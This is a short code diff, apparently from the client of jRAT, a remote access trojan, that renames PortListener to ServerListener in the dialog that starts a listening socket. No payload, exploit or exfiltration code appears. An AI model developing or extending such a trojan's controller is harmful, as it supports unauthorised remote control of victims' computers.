@@ -19,7 +19,7 @@ import javax.swing.SpinnerNumberModel;
 import javax.swing.border.EmptyBorder;
 
 import se.jrat.client.ErrorDialog;
-import se.jrat.client.net.PortListener;
+import se.jrat.client.net.ServerListener;
 import se.jrat.client.utils.Utils;
 
 @SuppressWarnings("serial")
@@ -139,7 +139,7 @@ public class FrameAddSocket extends BaseFrame {
 			} else if (name.length() == 0) {
 				name = "Socket" + (new Random()).nextInt(10000);
 			}
-			PortListener connection = new PortListener(name, port, timeout, pass);
+			ServerListener connection = new ServerListener(name, port, timeout, pass);
 			connection.start();
 			setVisible(false);
 			dispose();
